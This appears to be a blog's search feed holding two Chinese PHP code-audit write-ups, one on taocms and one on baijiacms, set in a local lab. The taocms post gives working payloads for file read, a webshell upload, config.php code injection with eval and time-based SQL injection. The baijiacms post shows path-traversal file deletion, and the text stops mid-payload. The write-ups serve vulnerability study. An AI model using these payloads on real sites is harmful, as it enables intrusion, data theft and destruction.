<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>php代审2——Taocms</title>
    <link href="/2025/01/21/php%E4%BB%A3%E5%AE%A12%E2%80%94%E2%80%94Taocms/"/>
    <url>/2025/01/21/php%E4%BB%A3%E5%AE%A12%E2%80%94%E2%80%94Taocms/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="taocms代码审计"><a href="#taocms代码审计" class="headerlink" title="taocms代码审计"></a>taocms代码审计</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p><a href="https://github.com/taogogo/taocms">taocms</a></p><p>phpstudy8.1.1.3</p><p>apache2.4.39+mysql5.7.26+php5.6.9</p><h2 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h2><p>先创建一个database，<code>create database taocms;</code></p><p><img src="https://s2.loli.net/2025/01/21/MV3ZLy7jJxPQovT.png" alt="image-20250120100949653"></p><p>直接访问站点install.php，数据库类型选择mysql，构建数据库配置<code>|127.0.0.1:3306|root|root|taocms</code></p><p><img src="https://s2.loli.net/2025/01/21/2XHQLvj75S38IGg.png" alt="image-20250120101306885"></p><p>直接安装即可</p><p><img src="https://s2.loli.net/2025/01/20/J3Fda7chOkLV6no.png" alt="image-20250120101447066"></p><p>登录，再设定一下网站地址即可</p><p><img src="https://s2.loli.net/2025/01/21/2rzBoN17xIkTdwH.png" alt="image-20250120101943314"></p><h2 id="3、路由审计"><a href="#3、路由审计" class="headerlink" title="3、路由审计"></a>3、路由审计</h2><p>1、大概看一下目录结构</p><p><img src="https://s2.loli.net/2025/01/21/cnrklUKjaeJPYOS.png" alt="image-20250120111539425"></p><p>主要涉及到以下目录</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span>  后台管理<br>data   数据，例如一些文章<br><span class="hljs-keyword">include</span> 配置文件、一部分类<br><span class="hljs-keyword">template</span>  图片文件<br>wap存储评论<br></code></pre></td></tr></table></figure><p>2、看看站点的url，并结合网站目录，分析路由</p><p>单纯看该cms的后台管理，发现无论点击左栏的任意项目，url都是<code>http://taocms/admin/admin.php?action=frame&amp;ctrl=iframes</code>，这明显不太对，怎么可能一点都不改变，于是我直接尝试执行一个功能点，抓个包看看情况（代码功底比较差，还是集合功能点理解），以”sql执行”为例</p><p><img src="https://s2.loli.net/2025/01/21/qLTn4cPeyB8YzRj.png" alt="image-20250120115000255"></p><p>执行语句，并抓包</p><p><img src="https://s2.loli.net/2025/01/21/cXWZiT3qSuaost1.png" alt="image-20250120115154712"></p><p>关注一下post传入的参数</p><p><img src="https://s2.loli.net/2025/01/21/gnHqjcovpmrtuZx.png" alt="image-20250120115244722"></p><p>目前查看ctrl有iframes、display值；action有frame、sql等值</p><p>依次全局搜索一下值，找一下共同点</p><p><img src="https://s2.loli.net/2025/01/21/LEGv48baUeXFMxm.png" alt="image-20250120115751947"></p><p><img src="https://s2.loli.net/2025/01/21/ig6dm5nl8ZhsCea.png" alt="image-20250120115832558"></p><p>发现ctrl参数都对应了一个方法</p><p><img src="https://s2.loli.net/2025/01/20/SzV1QT8LPCAyegs.png" alt="image-20250120115940358"></p><p><img src="https://s2.loli.net/2025/01/21/kgSJCoOG896dNDp.png" alt="image-20250120120001908"></p><p>而action参数则是应该对应类名</p><p>所以我们差不都就明白了路由，再后台管理界面，action对应了类名、ctrl对应类中的方法名，而每一个类都以文件名的形式，放在include&#x2F;model目录下</p><p><img src="https://s2.loli.net/2025/01/20/Vti1k85cIdEhlrJ.png" alt="image-20250120120346257"></p><p>上述就是我们根据url和目录结构分析的，这个方法比较好理解，现在我们直接看路由与页面跳转相关的代码，保存在admin.php中</p><p><img src="https://s2.loli.net/2025/01/21/zmlyn6PvFMO2YNs.png" alt="image-20250121121017872"></p><h2 id="4、漏洞审计"><a href="#4、漏洞审计" class="headerlink" title="4、漏洞审计"></a>4、漏洞审计</h2><h3 id="漏洞1：任意文件读取"><a href="#漏洞1：任意文件读取" class="headerlink" title="漏洞1：任意文件读取"></a>漏洞1：任意文件读取</h3><p>全局函数file_get_contents()，这个函数主要是获取文件内容，但是不能输出，所以我也要看是否有输出，于是选定了下面这个文件</p><p><img src="https://s2.loli.net/2025/01/20/g1YGZmworOtAX6W.png" alt="image-20250120132333814"></p><p>我进一步查看，发现是在一个download函数里面</p><p><img src="https://s2.loli.net/2025/01/20/nGdZYpISqUCgrXu.png" alt="image-20250120132543313"></p><p>看了看，读取的变量为realpath，跟随其变量</p><p><img src="https://s2.loli.net/2025/01/20/j4UaR3fqduO1rcH.png" alt="image-20250120132843487"></p><p>该变量是在construct魔术方法中，我们只需要直接传入path变量，再在上述download方法中发现，对path使用pathinfo方法，对我们的文件路径没有做任何限制和过滤，同时SYS_ROOT为网站根目录</p><p><img src="https://s2.loli.net/2025/01/20/CWr7UTbP1Q4pBjt.png" alt="image-20250120134055715"></p><p>所以我们只需要直接传入path参数，就可以实现任意文件读取了</p><h3 id="漏洞1验证"><a href="#漏洞1验证" class="headerlink" title="漏洞1验证"></a>漏洞1验证</h3><p>创建一个test.txt文件用于验证</p><p>构建payload：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">http://taocms/<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span>.php?action=<span class="hljs-keyword">file</span>&amp;ctrl=download&amp;path=test.txt<br></code></pre></td></tr></table></figure><p>发现报错，refer error应该是要求refer请求头</p><p><img src="https://s2.loli.net/2025/01/21/Mt6qdDi3FrPoUaz.png" alt="image-20250120171204252"></p><p>翻翻代码，发现要ReferHost(referer请求头)要和Host请求头一样，否则会发生跳转，所以我们直接添加referer请求头</p><p><img src="https://s2.loli.net/2025/01/20/YUxHS7Vgnzma3ru.png" alt="image-20250120171554430"></p><p>成功读取</p><p><img src="https://s2.loli.net/2025/01/20/aBLTdwUG5W7n8qM.png" alt="image-20250120171925490"></p><p>当然也可以读取配置文件等</p><p><img src="https://s2.loli.net/2025/01/20/bFsxCZe35aU1uwz.png" alt="image-20250120172113681"></p><h3 id="漏洞2：任意文件上传getshell"><a href="#漏洞2：任意文件上传getshell" class="headerlink" title="漏洞2：任意文件上传getshell"></a>漏洞2：任意文件上传getshell</h3><p>我们全局检索<code>upload(</code>关键词</p><p>发现一个upload函数，但是是采用白名单过滤的，就放弃了</p><p><img src="https://s2.loli.net/2025/01/20/G7zTUBOt5yLkahe.png" alt="image-20250120172815405"></p><p>然后我们再检索一下move_uploaded_file函数</p><p><img src="https://s2.loli.net/2025/01/20/9dfOkCB2HaDt1rL.png" alt="image-20250120173055961"></p><p>然后我们根据tmpfile变量，但是没有我们可以传参的地地方，索性直接下一个。找了一阵代码没有什么比较好的突破口，我们直接回归功能点，根据web界面的功能点，去查看相关文件上传操作，并回归代码。</p><p><img src="https://s2.loli.net/2025/01/20/62nGdN14KpIsrfj.png" alt="image-20250120194333465"></p><p>很明显的文件管理，直接新建一个1.php文件，并抓包</p><p><img src="https://s2.loli.net/2025/01/20/PvNTDtMI4FVyQ7h.png" alt="image-20250120194628617"></p><p>根据路由找到相关代码：file类中的create函数，fopenhan’shu</p><p><img src="https://s2.loli.net/2025/01/20/vq2YHINfFXpLAZ3.png" alt="image-20250120194800148"></p><p>没有做任何过滤，直接上传成功，直接编辑，写入php代码</p><p><img src="https://s2.loli.net/2025/01/20/8dMWJ659QIVzFGC.png" alt="image-20250120194923419"></p><p><img src="https://s2.loli.net/2025/01/21/uKyN3ClmI4BsWxA.png" alt="image-20250120195018697"></p><p>在网站根目录下，直接访问，成功getshell</p><p><img src="https://s2.loli.net/2025/01/20/yuSmWvcKtXxEkBU.png" alt="image-20250120195054948"></p><h3 id="漏洞3：mysql日志写入getshell-失败"><a href="#漏洞3：mysql日志写入getshell-失败" class="headerlink" title="漏洞3：mysql日志写入getshell(失败)"></a>漏洞3：mysql日志写入getshell(失败)</h3><p>其实这个不怎么需要代码审计，我们直接黑盒思路，因为这个cms的后台管理确实也太明目张胆了，真的就纯纯根据功能点来进行审计。</p><p>我们直接在”执行sql”处执行sql语句<code>select @@version;</code>，查看版本为5.7.26</p><p><img src="https://s2.loli.net/2025/01/20/5gNXVxaEOpvLJCF.png" alt="image-20250120195806357"></p><p>mysql版本5.6.34之后secure_file_priv值，默认为NULL，无法进行文件写入。于是我们使用日志写入shell，我们先查看</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/01/20/LudfbjvRMB4rhUF.png" alt="image-20250120204824564"></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set global general_log = &quot;ON&quot;;</span><br><span class="language-xml">set global general_log_file=&#x27;D:\phpstudy_pro\WWW\taocms\2.php&#x27;;</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br></code></pre></td></tr></table></figure><p>原本以为万无一失，但是奈何此处不能执行多条sql语句，就失败了。</p><h3 id="漏洞4：修改配置文件getshell"><a href="#漏洞4：修改配置文件getshell" class="headerlink" title="漏洞4：修改配置文件getshell"></a>漏洞4：修改配置文件getshell</h3><p>翻阅网站功能点，在<code>网站设置</code>栏，更新功能点有个数据库的配置，同时猜想，可能在这个功能点会把相关配置写入配置文件中，于是审计以下代码，有没有可乘之机</p><p><img src="https://s2.loli.net/2025/01/20/r29zBpuTxhU85DL.png" alt="image-20250120212525582"></p><p>可见该函数会先判断是否config.php是否可写，然后先销毁POST变量，然后重新传入POST参数，进行重新配置，其中POST的内容会被safeword函数进行过滤，我们进一步跟进safeword函数。</p><p><img src="https://s2.loli.net/2025/01/20/vKA94S6Q2INdRwC.png" alt="image-20250120213006505"></p><p>默认level&#x3D;8，然后就走默认的level，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeword</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>,<span class="hljs-variable">$level</span>=<span class="hljs-number">8</span></span>)</span>&#123;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ucfirst</span>(DB)==<span class="hljs-string">&#x27;Sqlite&#x27;</span>)&#123;<br><span class="hljs-variable">$safeword</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>,<span class="hljs-variable">$text</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$safeword</span>=<span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">_addslashs</span>(<span class="hljs-variable">$text</span>);<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不是Sqlite，于是直接使用_addslashs()方法，进一步跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_addslashs</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>)</span>&#123;<br><span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$text</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>addslashes函数主要对一些特殊符号（通过在字符串中的单引号、双引号、反斜杠和 NULL 字符前加上反斜杠）来转义这些字符,所以就是会对我们POST传入的参数，进行简单转义</p><p><img src="https://s2.loli.net/2025/01/20/oByEckNMtew3ClQ.png" alt="image-20250120213916163"></p><p>然会会将我们传入的内容直接写入config.php中，我们就可尝试直接在config.php中写入一句话木马，构造payload尝试绕过</p><p><img src="https://s2.loli.net/2025/01/20/7cQeEn89RFqVygt.png" alt="image-20250120215353435">但是迫于addslashes函数，还是失败了</p><p><img src="https://s2.loli.net/2025/01/20/8sXFMqWwha3IOUN.png" alt="image-20250120215423909"></p><p>但是我们可以通过上一个if判断（数据库为Sqlite）来写入，这样以来，只会有一个字符替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$safeword</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>,<span class="hljs-variable">$text</span>);<br></code></pre></td></tr></table></figure><p>于是我们重新构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">\&#x27;);@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]);/*<br></code></pre></td></tr></table></figure><p><strong>记得选择sqlite数据库！</strong></p><p><img src="https://s2.loli.net/2025/01/21/aLXD3kERHbTIf6Y.png" alt="image-20250121095400099"></p><p>成功修改配置</p><p><img src="https://s2.loli.net/2025/01/21/xKLc2XNehBwGRUz.png" alt="image-20250121100240950"></p><p>成功getshell</p><p><img src="https://s2.loli.net/2025/01/21/aCMLeWo4JzRPI36.png" alt="image-20250121100312616"></p><p>还可以通过install.php，安装的时候也根据上面选择sqlite，然后再构建payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>|<span class="hljs-type">root</span>|<span class="hljs-type">root</span>|<span class="hljs-type">taocms</span>|<span class="hljs-type">&#x27;);eval</span>($_REQUEST[&#x27;cmd&#x27;]);//<br></code></pre></td></tr></table></figure><p>即可再次写入config.php文件getshell</p><h3 id="漏洞5：任意文件删除"><a href="#漏洞5：任意文件删除" class="headerlink" title="漏洞5：任意文件删除"></a>漏洞5：任意文件删除</h3><p>检索unlink(，检索到下述代码</p><p><img src="https://s2.loli.net/2025/01/21/n3IHov6NFkWLiEV.png" alt="image-20250121105539158"></p><p>没有什么过滤，直接构造payload，开删</p><p><img src="https://s2.loli.net/2025/01/21/VmRB2rgDWwbnYt3.png" alt="image-20250121110045349"></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>整个cms还有很多sql注入</p><p>其中一个为例，我们通过翻阅函数，发现一个delist函数，该函数没有对sql语句及其参数使用过滤</p><p><img src="https://s2.loli.net/2025/01/21/3Qhg4AXxOMZi1dK.png" alt="image-20250121120214437"></p><p>然后向上查找，找到cms类中有del方法调用delist方法，但是根据原delist函数发现没有回显，所以要采用盲注等方法</p><p><img src="https://s2.loli.net/2025/01/21/BJeZOsKWF5NnEo8.png" alt="image-20250121120317739"></p><p>此处id就是我们的注入点，那我们该如何传入这个参数？于是我们尝试追踪id参数，找到了Article类中的id变量，为什么会定位到Article类，因为Cms类其实是继承了Article类的（如下）</p><p><img src="https://s2.loli.net/2025/01/21/NEgXDBLCz9oa5tq.png" alt="image-20250121121709214"></p><p>然后我们通过查看Article类中的属性、方法，发现创建该类时就会调用魔术方法，__construct，然后使id&#x3D;0，这难道就不能传参了？肯定不会止步于此</p><p><img src="https://s2.loli.net/2025/01/21/Iy3zeWsponlFZVw.png" alt="image-20250121121503959"></p><p>回看之前admin.php中的路由与参数</p><p><img src="https://s2.loli.net/2025/01/21/cwx14Cu9KLUDEd7.png" alt="image-20250121122335863"></p><p>我们创建类的时候，是可以自己通过传参传入id参数的，从而突破了魔术方法的限制。而且PHP 中的子类可以使用父类的传参来创建子类对象。于是乎我们直接开始构造poc</p><p>可以加一个echo查看调试语句</p><p><img src="https://s2.loli.net/2025/01/21/SAxyrg9bkPRY5OU.png" alt="image-20250121132622711"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">action</span>=cms&amp;ctrl=del&amp;id=27) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1# <br></code></pre></td></tr></table></figure><p>没有成功</p><p>尝试时间盲注，时间盲注poc如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">action</span>=cms&amp;ctrl=del&amp;id=<span class="hljs-number">21</span>)+or+sleep(<span class="hljs-number">4</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/01/21/Hpa2SdJFQyRUkWG.png" alt="image-20250121131901022"></p><p>成功了！</p><p>当然里面还有很多未做好过滤的，需要检索sql语句关键字，耐心查看</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个cms表面易挖掘的漏洞点，可以通过功能点很快挖掘到。</p><p>而且它主要是通过类加载来实现功能点，也是它比较特殊的点。然后过滤函数也写得比较水，其实还是很好挖掘的，最重要的自我感觉还是一定要弄清楚，一开始只是对路由有个大概的理解，还是没有深度去看代码，导致了我之后对sql注入的传参、挖掘还懵了一下，所以<strong>路由很重要！！！不要局限在表面</strong></p><p>多了解了一个路由方式。还有就是深度挖掘经典漏洞可以从函数入手，但是权限方面的漏洞，自我感觉要结合黑盒的思路，通过功能、权限参数的对比，然后去深究代码挖掘。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>初识php代审——baijiacms</title>
    <link href="/2025/01/19/%E5%88%9D%E8%AF%86php%E4%BB%A3%E5%AE%A1%E2%80%94%E2%80%94baijiacms/"/>
    <url>/2025/01/19/%E5%88%9D%E8%AF%86php%E4%BB%A3%E5%AE%A1%E2%80%94%E2%80%94baijiacms/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="百家CMS代码审计"><a href="#百家CMS代码审计" class="headerlink" title="百家CMS代码审计"></a>百家CMS代码审计</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p><a href="https://gitee.com/openbaijia/baijiacms">baijiacms</a></p><p>phpstudy8.1.1.3</p><p>apache2.4.39+mysql5.7.26+php5.3.29</p><h2 id="2、搭建环境"><a href="#2、搭建环境" class="headerlink" title="2、搭建环境"></a>2、搭建环境</h2><p>先搭建一个百家数据库，为搭建站点做准备。</p><p><img src="https://s2.loli.net/2025/01/19/oCNmwY1iTQ76J54.png" alt="image-20250118121337302"></p><p>直接使用phpstudy搭建好站点，并访问</p><p><img src="https://s2.loli.net/2025/01/19/TBDZY6qvxt8iGgn.png" alt="image-20250118121423842"></p><p><img src="https://s2.loli.net/2025/01/19/Nte56wUgLdQjGAV.png" alt="image-20250118121439768"></p><p>连接数据库，并配置系统管理员</p><p><img src="https://s2.loli.net/2025/01/19/ZGPlOKurqJ9Y7Ra.png" alt="image-20250118121542074"></p><p>然后就成功创建了<img src="https://s2.loli.net/2025/01/19/OBzRChGbIxnq8u6.png" alt="image-20250118121750711"></p><h2 id="3、路由审计"><a href="#3、路由审计" class="headerlink" title="3、路由审计"></a>3、路由审计</h2><p>路由关系是代码审计第一步，我们可以通过找到代码、目录与网站页面的对应关系，让我们更好的验证漏洞</p><p>先走一下基础流程，大概的看一下目录结构，有个大概的印象</p><p><img src="https://s2.loli.net/2025/01/18/2Imwxydf1BtlhQs.png" alt="image-20250118122331387"></p><p>大概目录解释</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addons </span>    插件<br>api        接口<br>assets     静态文件<br>attachment 上传目录<br><span class="hljs-keyword">cache </span>     缓存目录<br><span class="hljs-built_in">config</span>     系统文件<br>include    系统文件<br>system     后端代码<br></code></pre></td></tr></table></figure><p>开始找路由关系，一些根基比较深的cms，往往有自己独家的路由设置，有使用手册的话，还需要通过cms的使用手册上去梳理路由关系。但是有个小捷径，就是可以直接对比站点的url和源码的目录结构，这个方法很快，更便于理解。</p><p>我们点进修改密码功能点，然后看看url</p><p><img src="https://s2.loli.net/2025/01/19/bWdTiNxe8H2rIpJ.png" alt="image-20250118122757261"></p><p>根据url中的关键字来找代码文件，直接全局检索”changepwd”，锁定到了三个文件</p><p><img src="https://s2.loli.net/2025/01/19/tjgh2NQYiEozCPL.png" alt="image-20250118123724137"></p><p>然后再根据url中的”manage”关键字，多半就是第一个</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">baijiacms\system\manager\template\web\changepwd.php<br><br><span class="hljs-name">http</span>://baijiacms/index.php?mod=site&amp;act=manager&amp;<span class="hljs-keyword">do</span>=changepwd&amp;beid=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>所以url中的act就对应system目录下下的目录，do就是对于的文件，但是mod是什么，我们再看一下baijiacms\system\manager\template\web\changepwd.php，这个路径，都不存在mod传递的键值”site”，于是我直接修改一下mod参数的参数值为web，同时删除了beid参数</p><p><img src="https://s2.loli.net/2025/01/19/Yn4F1zGUpmP5BSw.png" alt="image-20250118211524553"></p><p>结果还是正常访问，说明这里mod参数其实是文件的上一级目录，可能是开发的小心思，使用site可以平替web，现在我们就摸清路由关系了，如下</p><p><strong>mod（目标文件上一级目录）、act（system下一级目录）、do（目标文件名）</strong></p><h2 id="4、漏洞审计"><a href="#4、漏洞审计" class="headerlink" title="4、漏洞审计"></a>4、漏洞审计</h2><h3 id="审计前言"><a href="#审计前言" class="headerlink" title="审计前言"></a>审计前言</h3><p>一般的审计思路，分以下几种（经验浅显，还望大哥们斧正）：</p><p>1、直接通过可控变量查看漏洞点，但是不推荐，因为cms中变量太多，单纯通过POST、GET传参的变量数不胜数，量大且效率低下。</p><p>2、直接通过危险函数审计，全局检索危险函数，再查看危险函数的相关参数是否可控，如果可控再次跟进是否可以利用，更有目的性，但还是比价耗时间。</p><p>3、结合黑盒的思路，也即是跟根据功能点查找，这个可以快速的找到入手点，但是检索不全面，会审计不全面。</p><p>4、直接分析目录的结构同时结合网站页面，搞明白每个目录、文件、参数传递的对于的网站功能，也就是差不多通读源码了，这个虽然很费时间，但是可以让审计更加得心应手，也比较能审一些深入的洞</p><p>迫于刚刚接触白盒审计，只能站在各位大佬的肩膀上，复现大佬们的漏洞点了。</p><h3 id="漏洞1：任意目录及文件删除"><a href="#漏洞1：任意目录及文件删除" class="headerlink" title="漏洞1：任意目录及文件删除"></a>漏洞1：任意目录及文件删除</h3><p>通过全局检索关键删除文件函数unlink()，找到如下漏洞点</p><p><img src="https://s2.loli.net/2025/01/19/6EDvyLst3aXHp9I.png" alt="image-20250118180756069"></p><p>继续跟进，发现了一个file_delete函数</p><p><img src="https://s2.loli.net/2025/01/19/Lh1t5vyRQqs6bZ3.png" alt="image-20250118181139114"></p><p>该函数的大概流程是</p><p>1、empty函数判断文件是否为空，如果为空就返回true</p><p>2、$settings[‘system_isnetattach’]，这是一个系统设置(此处就是是否开始了oss、ftp存储文件，为1则是开启了)，empty($settings[‘system_isnetattach’])，判断系统设置为空则返回true，加上!，则是设置为空时，就跳过以下的代码(用来删除oss、ftp中存储的文件)</p><p>3、此时直接跳转到，判断如下：判断是否文件存在，则可以触发删除函数unlink()，同时发现没有对$file_relative_path，做任何过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(SYSTEM_WEBROOT . <span class="hljs-string">&#x27;/attachment/&#x27;</span> . <span class="hljs-variable">$file_relative_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">unlink</span>(SYSTEM_WEBROOT . <span class="hljs-string">&#x27;/attachment/&#x27;</span> . <span class="hljs-variable">$file_relative_path</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><p>通过全局检索<code>file_delete(</code>，跳转到使用该函数的代码块</p><p>定位到uploadeuploader.php<img src="https://s2.loli.net/2025/01/19/KLf7i1y4udUSDrM.png" alt="image-20250118200850062"></p><p>查看其代码逻辑</p><p><img src="https://s2.loli.net/2025/01/19/k4DZgueGzpq3WoP.png" alt="image-20250118200927137"></p><p>根据文件名和初步判断，这个文件大概分为两个部分，当$operation为upload时，进行文件上传操作；为remove时就会调用file_delete()函数，但是文件名变量使用$_GPC[‘file’]，这种形式怪怪的，没有见过，我们该怎么传参呢？</p><p>这个其实是该CMS特殊的定义，我们就看看其定义：</p><p><img src="https://s2.loli.net/2025/01/19/OnVSzdaiJX2ouGf.png" alt="image-20250118202723838"></p><p>没错，这个是global定义的变量，这使得php函数内部可以访问函数外部的全局变量，肯定也不乏超全局变量，所以索性我们就直接使用GET传参就行了。</p><p>除此之外还需要满足条件</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">$operation</span> == <span class="hljs-symbol">&#x27;remove</span>&#x27;)<br></code></pre></td></tr></table></figure><p>而该operation变量，也通过使用global定义</p><p><img src="https://s2.loli.net/2025/01/19/QMbHtYT6PCnINj4.png" alt="image-20250118203047159"></p><p>我们也就可以再次使用GET传参</p><h3 id="漏洞1验证"><a href="#漏洞1验证" class="headerlink" title="漏洞1验证"></a>漏洞1验证</h3><p>为了验证漏洞我们在根目录baijiacms下创建一个test.txt文件</p><p><img src="https://s2.loli.net/2025/01/19/4VAfYSGjqagb2KD.png" alt="image-20250118205328190"></p><p>然后根据文件判断漏洞路由，构造URL来验证即可，uploader.php文件的路径为</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">baijiacms\system\eshop\core\mobile\util\uploader.php<br></code></pre></td></tr></table></figure><p>根据我们之前的路由判断</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://baijiacms/<span class="hljs-keyword">index</span>.php?mod=util<span class="hljs-variable">&amp;act</span>=eshop<span class="hljs-variable">&amp;do</span>=uploader<span class="hljs-variable">&amp;op</span>=<span class="hljs-keyword">remove</span><span class="hljs-variable">&amp;file</span>=test.txt<br></code></pre></td></tr></table></figure><p>应该就可以实现任意文件删除了</p><p><img src="https://s2.loli.net/2025/01/19/OBbRuf8wxyqJt9I.png" alt="image-20250118205511248"></p><p>失败了？不，难道是test.txt的路径不对？我们网站的各个页面是基于system目录下的，而我们的test.txt文件和system目录同属baijiacms根目录下的，我们加个相对路径试一试，不过我们还是最好加一个回显，判断漏洞验证成功</p><p><img src="https://s2.loli.net/2025/01/19/ma8wkJ7SRlTFOj4.png" alt="image-20250118205845864"></p><p>使用以下payload再试一试</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://baijiacms/<span class="hljs-keyword">index</span>.php?mod=util<span class="hljs-variable">&amp;act</span>=eshop<span class="hljs-variable">&amp;do</span>=uploader<span class="hljs-variable">&amp;op</span>=<span class="hljs-keyword">remove</span><span class="hljs-variable">&amp;file</span>=../test.txt<br></code></pre></td></tr></table></figure><p>还是回显为空！</p><p><img src="https://s2.loli.net/2025/01/19/zUfvWd2eKG4crjB.png" alt="image-20250118210428321"></p><p>哪一步出了问题？经过再次在网站上点点点，发现还有一种路由方式，我勒个豆！</p><p><img src="https://s2.loli.net/2025/01/18/QDLFS4msiOuZ36H.png" alt="image-20250118210726044"></p><p>出现了多余的m参数，于是我们再翻一翻目录结构</p><p><img src="https://s2.loli.net/2025/01/18/SCMET4VakA3rWUw.png" alt="image-20250118211059903"></p><p>根据url找到了，上述目录及其文件，再根据php文件中，含有<code>评论</code>关键词与web界面的<code>评论管理</code>的匹配度，大概确定，就是这个路径了。根据上述再次梳理路由，url参数</p><p><strong>mod（目标文件上两级目录）、act（目标文件名）、do（目标文件上一级目录）、m（system下的目录）</strong></p><p>于是我们再次构造payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://baijiacms/<span class="hljs-keyword">index</span>.php?mod=mobile<span class="hljs-variable">&amp;act</span>=uploader<span class="hljs-variable">&amp;do</span>=util<span 